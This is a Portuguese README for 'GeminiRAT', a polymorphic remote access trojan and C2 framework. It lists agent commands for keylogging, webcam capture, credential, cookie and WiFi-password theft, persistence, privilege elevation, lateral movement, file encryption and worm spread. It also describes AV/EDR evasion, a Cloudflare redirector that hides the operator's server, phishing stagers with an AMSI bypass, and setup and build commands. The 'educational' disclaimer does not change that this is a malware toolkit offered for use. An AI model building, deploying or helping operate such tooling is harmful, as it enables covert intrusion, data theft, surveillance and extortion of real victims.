
<div align="center">

### 🔮 GeminiRAT - Polymorphic C2 Framework

![Version](https://img.shields.io/badge/version-6.0-blue.svg)
![Python](https://img.shields.io/badge/python-3.11+-green.svg)
![Agent](https://img.shields.io/badge/agent-Windows-lightgrey.svg)
![Server](https://img.shields.io/badge/server-Windows%20%7C%20Linux-lightgrey.svg)
![License](https://img.shields.io/badge/license-Educational-red.svg)
![Architecture](https://img.shields.io/badge/architecture-Polymorphic-purple.svg)

**Framework C2 (Command & Control) com arquitetura polimórfica, ofuscação em múltiplas camadas, redirector OPSEC via Cloudflare e painel web completo.**

[Características](#-características-principais) •
[Instalação](#-instalação) •
[Uso](#-uso-rápido) •
[Arquitetura](#-arquitetura) •
[Roadmap](#-roadmap)

</div>

---

## ⚠️ Aviso Legal

> **APENAS PARA FINS EDUCACIONAIS E DE PESQUISA EM SEGURANÇA**
>
> Este projeto foi desenvolvido exclusivamente para fins educacionais, pesquisa em segurança cibernética e testes autorizados em ambientes controlados pela **Techvel Consulting**. O uso não autorizado deste software em sistemas que você não possui ou não tem permissão explícita para testar é **ILEGAL** e pode resultar em consequências criminais e civis graves.
>
> Os desenvolvedores **NÃO** se responsabilizam por qualquer uso indevido, danos ou atividades ilegais realizadas com este software. Ao utilizá-lo, você assume total responsabilidade por suas ações.

---

## 🌟 Características Principais

### 🔄 Polimorfismo Avançado

- **Arquitetura Modular:** Sistema baseado no padrão Strategy — estratégias de ofuscação, compilação e assinatura são intercambiáveis
- **Build Único por Sessão:** Cada agente compilado possui hash único, dificultando assinaturas estáticas em AV/EDR
- **Ofuscação de Strings com AES-256:** Strings sensíveis criptografadas com AES-CBC e chave mestra por sessão
- **Renomeação Inteligente de Identificadores:** Funções e classes renomeadas aleatoriamente via AST, preservando o núcleo crítico

### 🌐 OPSEC — Redirector Cloudflare Worker

- **Proxy Transparente:** Agentes se comunicam com o Cloudflare Worker, nunca com o IP real do C2
- **Token de Validação:** Header `X-Cdn-Token` obrigatório — requisições sem token recebem página decoy
- **Decoy Page:** Requisições não autorizadas retornam HTML falso ("Nexus Cloud Services")
- **IP do C2 protegido:** Mesmo se o binário for capturado e analisado, o IP real não é exposto

### 🛡️ Evasão de Detecção

- **Anti-Análise Integrada:** Detecção de VMs (VMware, VirtualBox, QEMU), sandboxes e debuggers
- **Comunicação Criptografada:** Todo tráfego agente↔C2 criptografado com AES-256-GCM
- **HMAC-SHA256:** Autenticação de mensagens — evita spoofing e replay attacks
- **Beacon Jitter:** Intervalo de checkin com variação aleatória (+/- 30%) para dificultar detecção por timing (T1071)
- **Persistência Furtiva:** Instalação em locais plausíveis do sistema com nomes de processos legítimos

### 🎯 Funcionalidades do Agente

| Categoria | Funcionalidades |
|-----------|----------------|
| **Reconhecimento** | Sysinfo, processos, rede interna, credenciais, WiFi passwords |
| **Captura** | Screenshots, webcam, keylogger, clipboard |
| **Exfiltração** | Cookies/senhas de navegadores, histórico, arquivos |
| **Execução** | Shell remoto interativo, download/upload, comandos PowerShell |
| **Persistência** | Registro do Windows, tarefas agendadas, startup |
| **Lateral Movement** | Network scan (27 portas + banner grabbing), PSExec, pivoteamento |
| **Beacon** | Interval + Jitter configuráveis em runtime via comando `set_beacon` |

### 🖥️ Painel de Controle Web

- **RBAC:** Três níveis de acesso — Administrator, Operator, Observer
- **Shell Interativa:** Terminal por agente com histórico, Ctrl+C/L e MITRE ATT&CK badges
- **Mapa de Rede D3:** Visualização gráfica da topologia descoberta pelo agente
- **Pivot Chains:** Tabela de targets com portas, serviços e banner grabbing
- **Busca Cross-Agent:** Pesquisa de resultados entre todos os agentes simultaneamente
- **Linha do Tempo:** Progressão visual de tasks (pending → in_progress → completed/failed)
- **Audit Log:** Registro de todas as ações dos operadores
- **Perfis de Reconhecimento:** Sysinfo, processos e rede por agente com timestamp
- **Alertas Telegram:** Notificações configuráveis (agente conectado, offline, task timeout)

### 🏗️ Arquitetura de Build

```
┌──────────────────────────────────────────────────────────────┐
│                     Builder (Orquestrador)                    │
│  Pipeline de Build Configurável                               │
└──────────────────────────────────────────────────────────────┘
                              │
    ┌─────────────────────────┼───────────────────────┐
    ▼                         ▼                       ▼
┌──────────────┐   ┌──────────────────┐   ┌──────────────────┐
│  Obfuscation │   │   Compilation    │   │    Signature     │
│  Strategies  │   │   Strategies     │   │   Strategies     │
├──────────────┤   ├──────────────────┤   ├──────────────────┤
│ • String AES │   │ • PyInstaller    │   │ • CarbonCopy     │
│ • Identifier │   │ • Nuitka         │   │ • Custom Cert    │
│ • Dead Code  │   │ • Script (.py)   │   │ • Null           │
│ • Junk Code  │   └──────────────────┘   └──────────────────┘
└──────────────┘
                              │
                              ▼
              ┌───────────────────────────────┐
              │  Polymorphic Agent Binary     │
              │  + CDN Token (Redirector)     │
              └───────────────────────────────┘
```

---

## 🌐 Arquitetura de Rede (com Redirector)

```
[Agente Compilado]
        │
        │ HTTPS + X-Cdn-Token
        ▼
[Cloudflare Worker]  ←── Requisição inválida → Decoy Page HTML
        │
        │ Proxy transparente (token válido)
        ▼
[panelwhxami.shop]  (Cloudflare Proxy)
        │
        ▼
[VPS — ServidorHomologacao.py]  ← IP nunca exposto ao agente
```

---

## 🚀 Instalação

### Pré-requisitos

- **Python 3.11+** para o servidor; **Python 3.12 recomendado** para o Builder
- **Windows 10/11** para executar e compilar o agente atual
- O servidor Flask pode ser executado em Windows ou Linux
- **Node.js + Wrangler** (para deploy do Redirector Cloudflare)
- **Ambiente Virtual** (recomendado)

### Servidor C2

```bash
# Clone o repositório
git clone https://github.com/seu-usuario/GeminiRAT.git
cd GeminiRAT

# Crie e ative o ambiente virtual
python -m venv C2
C2\Scripts\activate        # Windows
# source C2/bin/activate   # Linux

# Instale apenas as dependências do servidor
pip install -r requirements-server.txt

# Inicie o servidor
python ServidorHomologacao.py
```

O painel estará disponível em `http://localhost:8000`

### Redirector Cloudflare Worker (OPSEC)

```bash
# Instale o Wrangler
npm install -g wrangler
wrangler login

# Configure os secrets
cd redirector
wrangler secret put C2_ORIGIN        # ex: https://panelwhxami.shop
wrangler secret put REDIRECT_SECRET  # ex: meu_token_secreto

# Deploy
wrangler deploy

# Monitorar logs em tempo real
wrangler tail --format pretty
```

### Compilar um Agente

```bash
pip install -r requirements-builder.txt
python Builder.py
```

Para preparar servidor, Builder e integrações opcionais no mesmo ambiente,
continue usando `pip install -r requirements.txt`.

Valide os contratos entre servidor, agente, painel e banco antes de um build:

```bash
python -m unittest discover -s tests -v
```

```
? URL do C2 (ou Redirector): https://geminirat-redirector.workers.dev
? Usar Cloudflare Worker como redirector? Yes
? CDN Token (REDIRECT_SECRET): meu_token_secreto
? Tipo de Saída: executável
? Aplicar ofuscação? Yes
? Nome do arquivo: agent.exe

--- Passo 1/4: JunkCodeInsertionStrategy ---
--- Passo 2/4: StringObfuscationStrategy ---
--- Passo 3/4: IdentifierManglingStrategy ---
--- Passo 4/4: PyInstallerCompilation ---

SUCESSO! Agente salvo em: payloads/agent.exe
```

---

## 💻 Uso Rápido

### Comandos do Agente

| Comando | Descrição | MITRE |
|---------|-----------|-------|
| `sysinfo` | Informações do sistema | T1082 |
| `screenshot` | Captura de tela | T1113 |
| `shell <cmd>` | Executa comando no shell | T1059 |
| `download <path>` | Baixa arquivo do alvo | — |
| `upload <local> <remote>` | Envia arquivo ao alvo | — |
| `keylogger_start` | Inicia keylogger | T1056 |
| `keylogger_stop` | Para keylogger | — |
| `webcam_snap` | Captura da webcam | T1125 |
| `credentials` | Rouba credenciais salvas | T1555 |
| `cookies` | Extrai cookies de navegadores | T1539 |
| `processes` | Lista processos | T1057 |
| `network_scan <range>` | Scan de rede com banner | T1046 |
| `network_recon` | Reconhecimento de rede | T1040 |
| `wifi_passwords` | Extrai senhas WiFi | T1040 |
| `persist` | Instala persistência | T1547 |
| `elevate` | Tenta elevar privilégios | T1548 |
| `lateral_psexec <ip>` | Movimento lateral via PSExec | T1021 |
| `set_beacon interval=15 jitter=0.4` | Ajusta timing do beacon em runtime | — |
| `encrypt <path>` | Criptografa arquivos | T1486 |
| `start_worm_mode` | Propaga agente na rede | T1203 |
| `cleanup` | Remove rastros e se destrói | — |

### Gerador de Stagers

```bash
python Builder.py
# → opção: Stager
```

Tipos disponíveis:

- **HTA (VBScript)** — phishing via arquivo .hta com variáveis ofuscadas
- **Macro VBA** — documento Office com AutoOpen ofuscado via ChrW()
- **Atalho Malicioso (.LNK)** — engenharia social com ícone customizável
- **PowerShell Avançado** — AMSI bypass + anti-sandbox (RAM/CPU/uptime) + download furtivo via BITS

---

## 🏛️ Estrutura de Diretórios

```
GeminiProject/
├── ServidorHomologacao.py     # Servidor C2 principal (Flask + SocketIO)
├── database.py                # Helpers SQLite (WAL mode, indexes)
├── Builder.py                 # Builder interativo de agentes
├── sigthief.py                # Roubo de assinatura digital (CarbonCopy)
├── requirements.txt             # Instalação completa
├── requirements-server.txt      # Servidor e painel
├── requirements-builder.txt     # Builder e agente Windows
├── requirements-optional.txt    # Integrações auxiliares
├── tests/                       # Contratos automatizados da arquitetura
│
├── agente/
│   └── agent.py               # Template do agente (~2900 linhas)
│
├── strategies/
│   ├── base.py                # Classes base (BuildStrategy, BuildContext)
│   ├── obfuscation.py         # JunkCode, StringObfuscation, IdentifierMangling
│   ├── compilation.py         # PyInstaller, Nuitka, ScriptOutput
│   ├── signing.py             # CarbonCopy, NullSignature
│   ├── stager.py              # HTA, VBA, LNK, PowerShell stagers
│   ├── mutation.py            # Mutação polimórfica
│   ├── loader_template.py     # Template de loader
│   └── string_obfuscator.py   # Motor de ofuscação AES de strings
│
├── redirector/
│   ├── worker.js              # Cloudflare Worker (proxy OPSEC + decoy)
│   └── wrangler.toml          # Config de deploy
│
├── templates/
│   ├── login.html
│   └── panel.html             # Painel web (~4200 linhas)
│
├── static/
│   └── css/                   # Temas e estilos
│
└── payloads/                  # Agentes compilados (saída do Builder)
```

---

## 🔐 Segurança e Criptografia

### Camadas de Proteção no Agente

| Camada | Técnica | Detalhe |
|--------|---------|---------|
| 1 | Ofuscação de Strings | AES-256-CBC, chave+IV únicos por string |
| 2 | Renomeação de Identificadores | AST-based, 10-12 chars aleatórios |
| 3 | Dead Code Injection | Funções e variáveis inúteis inseridas |
| 4 | Junk Code Insertion | Blocos de código morto entre funções reais |
| 5 | Anti-Análise | VM, sandbox, debugger detection |
| 6 | Comunicação | AES-256-GCM + HMAC-SHA256 |
| 7 | OPSEC | Redirector Cloudflare Worker + CDN Token |
| 8 | Beacon Jitter | Timing aleatório, dificulta detecção por análise de tráfego |

### Protocolo de Comunicação

```
Agente → C2:
  POST /register
  Headers: X-Cdn-Token, User-Agent (fake browser)
  Body: AES-GCM({ hostname, username, os, internal_ip, ... })
  + HMAC-SHA256 da mensagem

C2 → Agente:
  Response: AES-GCM({ task_id, command, args })

Agente → C2 (resultado):
  POST /task_result
  Body: AES-GCM({ task_id, data_type, data })
```

---

## 📊 Banco de Dados

SQLite com WAL mode e indexes de performance.

| Tabela | Descrição |
|--------|-----------|
| `agents` | Agentes registrados (uuid, hostname, IP, OS, status, tags, geo) |
| `tasks` | Fila de tarefas com state machine completa |
| `system_logs` | Eventos por agente |
| `keylogs` | Capturas do keylogger |
| `users` | Usuários do painel (RBAC) |
| `agent_profile` | Sysinfo, processos e reconhecimento de rede por agente |
| `c2_settings` | Configurações persistentes (alertas Telegram, etc.) |
| `tasks` + `system_logs` | Auditoria de tarefas e ações dos operadores |

---

## 🐛 Problemas Conhecidos

| Problema | Status | Workaround |
|----------|--------|------------|
| PyInstaller gera falsos positivos em AVs | ⚠️ Conhecido | Usar assinatura CarbonCopy ou Nuitka |
| Keylogger requer `pynput` no build | ⚠️ Conhecido | Incluído nos hidden-imports |
| Captura de webcam pode falhar em VMs | ⚠️ Conhecido | Testar em hardware real |
| `tempfile.mkdtemp()` bloqueado pelo Windows Defender | ✅ Corrigido | Build dir usa `BASE_DIR/.build_<uuid>` |
| f-strings quebrando StringObfuscationStrategy | ✅ Corrigido | Expressões extraídas para variáveis locais |

---

## 📜 Changelog

### v6.0.0 — Redirector OPSEC + Beacon Jitter (2026-07)
- ✨ Redirector OPSEC via Cloudflare Worker (`redirector/worker.js`)
- ✨ CDN Token (`X-Cdn-Token`) integrado no agente e no Builder
- ✨ Beacon Jitter — intervalo com variação aleatória (BEACON_INTERVAL + BEACON_JITTER)
- ✨ Comando `set_beacon` para ajustar timing em runtime sem recompilar
- 🐛 Fix: build dir migrado de `%TEMP%` para `BASE_DIR/.build_<uuid>` (Windows Defender)
- 🐛 Fix: f-strings extraídas para variáveis locais (StringObfuscationStrategy)

### v5.0.0 — Alertas Telegram + DB Indexes (2026-06)
- ✨ Sistema de alertas Telegram (agente conectado, offline, task timeout)
- ✨ Configuração de alertas via painel (bot token, chat ID, eventos)
- ✨ 6 indexes SQLite + tabela `c2_settings`
- ✨ Dedup de agentes por `internal_ip` (evita duplicatas no mapa)

### v4.0.0 — Painel Completo (2026-05)
- ✨ Shell interativa pura HTML/JS (removido xterm.js — CDN bloqueado por CSP)
- ✨ MITRE ATT&CK badges no shell
- ✨ Toast notifications (Notyf)
- ✨ Linha do tempo de tasks com progressão visual
- ✨ Busca cross-agent em resultados (`/api/results/search`)
- ✨ Mapa de rede D3 com pivot chains e banner grabbing
- ✨ Audit log de operadores
- ✨ Perfis de reconhecimento por agente (sysinfo, processos, rede)

### v3.0.0 — Polymorphic Refactor (2025-10)
- ✨ Arquitetura polimórfica baseada no padrão Strategy
- ✨ Pipeline de build modular e extensível
- ✨ Ofuscação de strings com AES-256-CBC
- ✨ Renomeação inteligente de identificadores via AST
- ✨ Gerador de stagers (HTA, VBA, LNK, PowerShell Avançado)

### v2.0.0 — Feature Complete (2024-09)
- ✨ Bypass de UAC, pivoteamento de rede, proxy reverso HTTP
- 🎨 Interface web com dashboard

### v1.0.0 — Initial Release (2024-06)
- 🎉 Lançamento inicial — C2 básico com comunicação criptografada

---

## 🚧 Roadmap — Em Desenvolvimento

### Alta Prioridade
- **[x] Fila Offline** — resultados pendentes são armazenados localmente e reenviados ao reconectar
- **[x] Retention Policy** — purge automático de tasks/resultados antigos, configurável na aba Config do painel

### Staged Payload
- **[ ] Agent Minimal** — novo target do Builder com capabilities essenciais (beacon, sysinfo, shell, screenshot, upgrade)
- **[ ] Stager integrado com CDN Token** — stager HTA/PS/VBA inclui `X-Cdn-Token` no download do payload, compatível com o redirector
- **[ ] Comando `upgrade`** — agent_minimal baixa e executa o agent_full a partir do C2
- **[ ] Anti-sandbox no HTA/VBA** — checagem de RAM/CPU/uptime antes de baixar o payload
- **[ ] Sleep aleatório nos stagers** — aguarda 2-4 min antes da execução para burlar sandboxes com timeout curto

### Inteligência (Média Prioridade)
- **[ ] MITRE ATT&CK Dashboard** — cobertura por agente/sessão, exportação de relatório
- **[ ] IOC Generator** — exportar IPs, processos, hashes em CSV/JSON/STIX para SIEM/BlueTeam
- **[ ] Agent Comparator** — diff de sysinfo/processos/rede entre dois agentes selecionados
- **[ ] Sigma Rules Generator** — gera regras de detecção baseadas nas técnicas observadas

### Infraestrutura
- **[ ] Docker** — Dockerfile + docker-compose com volumes SQLite e certs

### Educacional (Techvel Consulting)
- **[ ] Módulo de Conscientização** — modo demo seguro com relatório "o que o atacante viu"
- **[ ] Alertas Defensivos** — alertas no formato SIEM para cada técnica ATT&CK executada

---

## 🙏 Agradecimentos

- **[PyInstaller](https://www.pyinstaller.org/)** — Compilação de executáveis Python
- **[PyCryptodome](https://www.pycryptodome.org/)** — Criptografia robusta
- **[Rich](https://github.com/Textualize/rich)** — Interface de terminal
- **[Questionary](https://github.com/tmbo/questionary)** — Prompts interativos
- **[Cloudflare Workers](https://workers.cloudflare.com/)** — Infraestrutura do redirector
- **[MITRE ATT&CK](https://attack.mitre.org/)** — Framework de técnicas e táticas
- **Comunidade de Segurança Cibernética** — Inspiração e conhecimento compartilhado

---

<div align="center">

Desenvolvido por **André / whx4mi** — [Techvel Consulting](https://techvel.com.br)

</div>
